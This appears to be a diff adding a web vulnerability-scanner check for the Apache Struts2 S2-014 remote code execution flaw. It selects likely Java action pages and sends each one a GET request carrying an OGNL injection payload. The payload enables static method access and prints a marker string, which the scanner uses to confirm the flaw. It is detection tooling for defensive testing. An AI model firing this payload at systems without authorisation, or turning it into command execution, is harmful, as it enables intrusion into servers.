@@ -1,0 +1,85 @@
+#include helpers.inc;
+#include string_helpers.inc;
+#include os_detection.inc;
+#include static_files_extensions.inc;
+// files to be tested
+var files = new Array();
+var lastJob = null;
+var vulnCount = 0;
+// **************************************************************************************							 
+function alert(uri, vxml, job, matchedText)
+{	
+	var ri = new TReportItem();
+	ri.LoadFromFile(vxml);
+	ri.affects = uri;
+	ri.alertPath = "Scripts/" + vxml; 	
+	ri.setHttpInfo(job);
+	addHTTPJobToCrawler(job, 1, 1);
+	
+	AddReportItem(ri);	
+}							 			
+function testURI(uri)
+{
+	lastJob = new THTTPJob();
+	lastJob.verb = "GET";
+	lastJob.url  = scanURL;	
+	lastJob.uri  = uri + "?aaa=1${#_memberAccess['allowStaticMethodAccess']=true,@org.apache.struts2.ServletActionContext@getResponse().getWriter().print('2YpT2HjgVx9nGEPSSmmRVxArhgwUAR5fp76k9u9sd2Ygza7Vms'.replace('RVxArhgwUAR5fp7','acunetix')).close()}";		
+	lastJob.execute();
+	
+	if (!lastJob.wasError && !lastJob.notFound && lastJob.response.body.indexOf("2YpT2HjgVx9nGEPSSmmacunetix6k9u9sd2Ygza7Vms") != -1) return true;
+	else return false;
+}
+/***********************************************************************************/
+function testVulnOnFile(file)
+{	
+	if (testURI(file))
+	{
+		alert(file, 'Struts2_Remote_Code_Execution_S2014.xml', lastJob);
+		vulnCount = vulnCount + 1;
+	}
+}
+/***********************************************************************************/
+function prepareFilesToBeTested(list)
+{	
+	for (var i=0;i<list.count; i++){	
+		var sf = list.getFile(i);		
+		
+		if(!sf.notFound && !sf.ignored && sf.scanSiteFile && sf.isFile)
+		{
+			if (sf.Name.endsWith(".action") || sf.Name.endsWith(".do") || sf.Name.endsWith(".jsp") || sf.Name.endsWith(".page")) 
+			{
+				if (files.length < 50)
+					files.push(sf.fullPath);
+			}				
+		}	
+	}	
+	
+	// if no .action and so on files were found, add the first non-static files if Java was detected.
+	if (files.length < 50 && isJava) {
+		for (var i=0;i<list.count; i++){	
+			var sf = list.getFile(i);		
+			
+			if(!sf.notFound && !sf.ignored && sf.scanSiteFile && sf.isFile)
+			{
+				if (!isStaticExtension(getFileExt(sf.name)))
+				{
+					if (files.length < 50)
+						files.push(sf.fullPath);
+				}					
+			}	
+		}		
+	}	
+}
+/***********************************************************************************/
+/* main entry point */
+var list = getNewFiles(0);
+prepareFilesToBeTested(list);
+if (files.length > 0) 
+{
+	for (var i=0; i<files.length; i++)
+	{
+	  // don't test on all files (stop after 2 vulnerable action files).
+		if (vulnCount < 2)
+			testVulnOnFile(files[i]);
+	}
+}
